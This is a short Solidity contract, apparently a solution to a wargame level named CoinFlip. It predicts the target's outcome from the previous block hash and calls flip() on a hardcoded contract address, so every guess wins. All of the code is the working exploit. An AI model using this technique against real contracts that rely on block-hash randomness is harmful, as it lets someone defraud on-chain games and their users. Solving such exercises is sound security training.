// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/CoinFlip.sol";

contract CoinFlipAttack {
  CoinFlip coinflip = CoinFlip(0xf3eE3C4Ec25e8414838567818A30C90c7d62f834);
  
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {}

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    coinflip.flip(side);
  }
}
